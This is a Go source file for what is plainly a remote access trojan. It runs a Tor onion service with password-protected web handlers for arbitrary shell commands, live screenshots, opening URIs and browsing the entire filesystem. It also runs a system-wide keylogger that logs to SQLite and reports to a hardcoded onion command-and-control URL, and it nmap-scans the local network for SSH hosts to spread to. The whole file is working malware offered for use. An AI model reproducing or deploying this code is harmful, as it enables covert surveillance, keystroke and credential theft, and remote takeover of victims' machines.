package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	mr "math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"unicode/utf8"

	"github.com/cretz/bine/tor"

	// libtor "github.com/ipsn/go-libtor"
	// "github.com/cretz/bine/process/embedded"
	"github.com/clementauger/tor-prebuilt/embedded"

	nmap "github.com/Ullaakut/nmap/v2"
	"github.com/kbinani/screenshot"
	hook "github.com/robotn/gohook"
	"github.com/schollz/httpfileserver"
	"github.com/skratchdot/open-golang/open"
)

const (
	PASSWORD = "toor"
	cc       = "http://hz3rfqrugxvwy3vl.onion/cc"
)

var (
	ErrorUnterminated         = errors.New("unterminated single-quoted string")
	ErrorUnterminatedDouble   = errors.New("unterminated double-quoted string")
	ErrorUnterminatedBacklash = errors.New("unterminated backslash-escape")
)

var (
	splitChars        = " \n\t"
	singleChar        = '\''
	doubleChar        = '"'
	escapeChar        = '\\'
	doubleEscapeChars = "$`\"\n\\"
	UnixDirs          = []string{"/home/", "/usr/", "/var/", "/etc/", "/bin/", "/boot/", "/dev/", "/media/"}
)

func main() {
	var priv *rsa.PrivateKey
	// pub := &rsa.PublicKey{}
	if _, err := os.Stat("privateuser.key"); os.IsNotExist(err) {
		priv, _ = createSavePubPrivKeys()
	} else {
		priv, _ = readPubPrivKeys()
	}

	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")

	t, err := tor.Start(context.Background(), &tor.StartConf{ProcessCreator: embedded.NewCreator()})
	dealWithSignals()
	if err != nil {
		panic(err)
	}
	defer t.Close()
	go keylogger(t)
	// Add a handler
	http.HandleFunc("/sh/", SHhandler)
	http.HandleFunc("/open/", OpenHandler)
	http.HandleFunc("/screen/", ScreenHandler)
	http.HandleFunc("/", HomeHandler)

	http.Handle("/root/", httpfileserver.New("/root/", "/").Handle())
	dir, _ := os.Getwd()
	http.Handle("/pwd/", httpfileserver.New("/pwd/", dir).Handle())
	for _, dir := range UnixDirs {
		http.Handle(dir, httpfileserver.New(dir, dir+"/").Handle())
	}

	for c := 'A'; c <= 'Z'; c++ {
		http.Handle(fmt.Sprintf("/%c", c), httpfileserver.New(fmt.Sprintf("/%c", c), fmt.Sprintf("%c:/", c)).Handle())
	}
	listenCtx, _ := context.WithTimeout(context.Background(), 300*time.Hour)

	mr.Seed(time.Now().UnixNano())
	port := mr.Int31()

	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, LocalPort: int(port)%(1<<15) + 1000, Key: priv, RemotePorts: []int{80}})
	if err != nil {
		panic(err)
	}
	fmt.Printf("Open Tor browser and navigate to http://%v.onion\n", onion.ID)

	if err != nil {
		panic(err)
	}
	// go func() {
	// 	for range time.NewTicker(30 * time.Second).C {
	// 		PostToURL(cc, t, []byte(onion.ID))
	// 		// Infect(Seek())
	// 	}
	// }()
	log.Fatal(http.Serve(onion, nil))
}
func deleteDataDirs() {
	dir, err := os.Getwd()
	if err != nil {
		dir = "."
	}
	info, err := ioutil.ReadDir(dir)
	if err != nil {
		panic(err)
	}
	for _, item := range info {
		if strings.HasPrefix(item.Name(), "data-dir-") {
			os.RemoveAll(item.Name())
		}
	}
}

func keylogger(t *tor.Tor) {
	if _, err := os.Stat("db.db"); os.IsNotExist(err) {
		fmt.Println("Creating db.db...")
		file, err := os.Create("db.db") // Create SQLite file
		if err != nil {
			panic(err)
		}
		file.Close()
		fmt.Println("db.db created")
	}

	db, _ := sql.Open("sqlite3", "./db.db") // Open the created SQLite File
	defer db.Close()                        // Defer Closing the database
	// Create Database Tables
	if _, err := CreateTable(db); err != nil {
		log.Panic(err)
	}
	ev := hook.Start()
	for err := range RunHook(t, cc, db, ev) {
		log.Println(err)
	}
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func cidrToHosts(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}
	return ips[1 : len(ips)-1], nil
}

func Seek() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	out := []string{}
	for _, v := range localAddresses() {
		hosts, err := cidrToHosts(v + "/24")
		if err != nil {
			return err
		}
		out = append(out, hosts...)
	}

	scanner, err := nmap.NewScanner(
		nmap.WithTargets(out...),
		nmap.WithPorts("22"),
		nmap.WithContext(ctx),
	)
	if err != nil {
		log.Fatalf("unable to create nmap scanner: %v", err)
	}

	result, warnings, err := scanner.Run()
	if err != nil {
		log.Fatalf("unable to run nmap scan: %v", err)
	}

	if warnings != nil {
		log.Printf("Warnings: \n %v", warnings)
	}

	// Use the results to print an example output
	for _, host := range result.Hosts {
		if len(host.Ports) == 0 || len(host.Addresses) == 0 {
			continue
		}

		fmt.Printf("Host %q:\n", host.Addresses[0])

		for _, port := range host.Ports {
			fmt.Printf("\tPort %d/%s %s %s\n", port.ID, port.Protocol, port.State, port.Service.Name)
		}
	}

	fmt.Printf("Nmap done: %d hosts up scanned in %3f seconds\n", len(result.Hosts), result.Stats.Finished.Elapsed)
	return nil
}

func localAddresses() (out []string) {
	out = []string{}
	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
		return
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
			continue
		}
		for _, a := range addrs {
			out = append(out, a.String())
		}
	}
	return
}

func RunCmd(s string) string {

	fmt.Println("exec:", s)

	args, _ := Split(s)

	cmd := exec.Command(args[0], args[1:]...)

	var out bytes.Buffer
	var errorOutput bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &errorOutput

	err2 := cmd.Run()

	outputString := out.String()

	if err2 != nil {
		log.Println(err2)
		return errorOutput.String()
	}

	outputString = strings.Replace(outputString, "\n", "<br />", -1)

	return outputString

}

func PostToURL(cc string, t *tor.Tor, data []byte) (string, error) {
	// dialCtx, dialCancel := context.WithTimeout(context.Background(), 30*time.Second)
	// defer dialCancel()
	// Make connection
	dialer, err := t.Dialer(context.Background(), nil)
	if err != nil {
		return "", err
	}
	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
	// Wait at most a minute to start network and get
	values := map[string]string{"self": string(data)}

	jsonValue, err := json.Marshal(values)
	if err != nil {
		return "", err
	}

	resp, err := httpClient.Post(cc, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}

func createSavePubPrivKeys() (*rsa.PrivateKey, *rsa.PublicKey) {
	priv, pub := GenerateRsaKeyPair()
	// Export the keys to pem string
	priv_pem := ExportRsaPrivateKeyAsPemStr(priv)
	pub_pem, _ := ExportRsaPublicKeyAsPemStr(pub)

	// Import the keys from pem string
	priv_parsed, _ := ParseRsaPrivateKeyFromPemStr(priv_pem)
	pub_parsed, _ := ParseRsaPublicKeyFromPemStr(pub_pem)

	// Export the newly imported keys
	priv_parsed_pem := ExportRsaPrivateKeyAsPemStr(priv_parsed)
	pub_parsed_pem, _ := ExportRsaPublicKeyAsPemStr(pub_parsed)

	// Check that the exported/imported keys match the original keys
	if priv_pem != priv_parsed_pem || pub_pem != pub_parsed_pem {
		fmt.Println("Failure: Export and Import did not result in same Keys")
	} else {
		fmt.Println("Success")
	}
	err := ioutil.WriteFile("privateuser.key", []byte(priv_pem), 0644)
	if err != nil {
		panic(err)
	}
	err = ioutil.WriteFile("publicuser.key", []byte(pub_pem), 0644)
	if err != nil {
		panic(err)
	}
	return priv, pub
}

func readPubPrivKeys() (*rsa.PrivateKey, *rsa.PublicKey) {
	priv_pem, err := ioutil.ReadFile("privateuser.key")
	if err != nil {
		panic(err)
	}
	pub_pem, err := ioutil.ReadFile("publicuser.key")
	if err != nil {
		panic(err)
	}

	priv, _ := ParseRsaPrivateKeyFromPemStr(string(priv_pem))
	pub, _ := ParseRsaPublicKeyFromPemStr(string(pub_pem))
	return priv, pub
}

func SHhandler(w http.ResponseWriter, r *http.Request) {
	cmd := `<html>
	<body>
		<form method="POST" action="/sh/" target="_top">
			CMD:
			<input name="cmd">
			PW:
			<input name="password" type="password">
			<button type="submit">Go</button>
		</form>
		%s
		</body>
	</html>`
	if r.Method == http.MethodPost {
		if r.FormValue("password") == PASSWORD {
			w.Write([]byte(fmt.Sprintf(cmd, RunCmd(r.FormValue("cmd")))))
		} else {
			w.Write([]byte("NOPE.avi"))
		}
	} else if r.Method == http.MethodGet {
		w.Write([]byte(fmt.Sprintf(cmd, "")))
	}
}

func OpenHandler(w http.ResponseWriter, r *http.Request) {
	cmd := `<html>
	<body>
		<form method="POST" action="/open/" target="_top">
			URL:
			<input name="cmd">
			PW:
			<input name="password" type="password">
			<button type="submit">Go</button>
		</form>
		%s
		</body>
	</html>`
	if r.Method == http.MethodPost {
		if r.FormValue("password") == PASSWORD {
			// w.Write([]byte(fmt.Sprintf(cmd, RunCmd(r.FormValue("cmd")))))
			w.Write([]byte(fmt.Sprintf(cmd, open.Run(r.FormValue("cmd")))))
		} else {
			w.Write([]byte("NOPE.avi"))
		}
	} else if r.Method == http.MethodGet {
		w.Write([]byte(fmt.Sprintf(cmd, "")))
	}
}

func ScreenHandler(w http.ResponseWriter, r *http.Request) {
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		w.Write([]byte(fmt.Sprint(err)))
	}
	w.Write([]byte("<html><head><meta http-equiv=\"refresh\" content=\"5\"></head><body><img src=\"data:image/png;base64,"))
	e := base64.NewEncoder(base64.StdEncoding, w)
	err = png.Encode(e, img)
	if err != nil {
		w.Write([]byte(fmt.Sprint(err)))
	}
	w.Write([]byte("\"></body></html>"))
}

func HomeHandler(w http.ResponseWriter, r *http.Request) {
	unixUrls := ""
	for _, v := range UnixDirs {
		unixUrls += fmt.Sprintf("<li><a href=\"%s\">%s</a></li>", v, v)
	}
	winUrls := ""
	for c := 'A'; c <= 'Z'; c++ {
		winUrls += fmt.Sprintf("<li><a href=\"%c\">%c:/</a></li>", c, c)
	}
	w.Write([]byte(fmt.Sprintf(`<html><body>Control endpoints: 
	<ul>
	<li><a href="/sh">Shell</a></li>
	<li><a href="/screen">screen 0</a></li>
	<li><a href="/open">Open URI</a></li>
	<li><a href="/pwd">pwd</a></li>
	<li><a href="/root">/</a></li>
	%s
	%s
	</body>
	</html>`, unixUrls, winUrls)))
}

func Split(input string) (words []string, err error) {
	var buf bytes.Buffer
	words = make([]string, 0)

	for len(input) > 0 {
		// skip any splitChars at the start
		c, l := utf8.DecodeRuneInString(input)
		if strings.ContainsRune(splitChars, c) {
			input = input[l:]
			continue
		}

		var word string
		word, input, err = splitWord(input, &buf)
		if err != nil {
			return
		}
		words = append(words, word)
	}
	return
}

func dealWithSignals() {
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGTERM,
		syscall.SIGQUIT)
	go func() {
		<-sigc
		deleteDataDirs()
		os.Exit(0)
	}()
}

// stolen from stack overflow
func splitWord(input string, buf *bytes.Buffer) (word string, remainder string, err error) {
	buf.Reset()

raw:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == singleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto single
			} else if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto double
			} else if c == escapeChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto escape
			} else if strings.ContainsRune(splitChars, c) {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				return buf.String(), cur, nil
			}
		}
		if len(input) > 0 {
			buf.WriteString(input)
			input = ""
		}
		goto done
	}

escape:
	{
		if len(input) == 0 {
			return "", "", ErrorUnterminatedBacklash
		}
		c, l := utf8.DecodeRuneInString(input)
		if c == '\n' {
		} else {
			buf.WriteString(input[:l])
		}
		input = input[l:]
	}
	goto raw

single:
	{
		i := strings.IndexRune(input, singleChar)
		if i == -1 {
			return "", "", ErrorUnterminated
		}
		buf.WriteString(input[0:i])
		input = input[i+1:]
		goto raw
	}

double:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto raw
			} else if c == escapeChar {
				c2, l2 := utf8.DecodeRuneInString(cur)
				cur = cur[l2:]
				if strings.ContainsRune(doubleEscapeChars, c2) {
					buf.WriteString(input[0 : len(input)-len(cur)-l-l2])
					if c2 == '\n' {
					} else {
						buf.WriteRune(c2)
					}
					input = cur
				}
			}
		}
		return "", "", ErrorUnterminatedDouble
	}

done:
	return buf.String(), input, nil
}

func GenerateRsaKeyPair() (*rsa.PrivateKey, *rsa.PublicKey) {
	privkey, _ := rsa.GenerateKey(rand.Reader, 1024)
	return privkey, &privkey.PublicKey
}

func ExportRsaPrivateKeyAsPemStr(privkey *rsa.PrivateKey) string {
	privkey_bytes := x509.MarshalPKCS1PrivateKey(privkey)
	privkey_pem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: privkey_bytes,
		},
	)
	return string(privkey_pem)
}

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return priv, nil
}

func ExportRsaPublicKeyAsPemStr(pubkey *rsa.PublicKey) (string, error) {
	pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
	if err != nil {
		return "", err
	}
	pubkey_pem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: pubkey_bytes,
		},
	)

	return string(pubkey_pem), nil
}

func ParseRsaPublicKeyFromPemStr(pubPEM string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pubPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		return pub, nil
	default:
		break // fall through
	}
	return nil, errors.New("key type is not RSA")
}
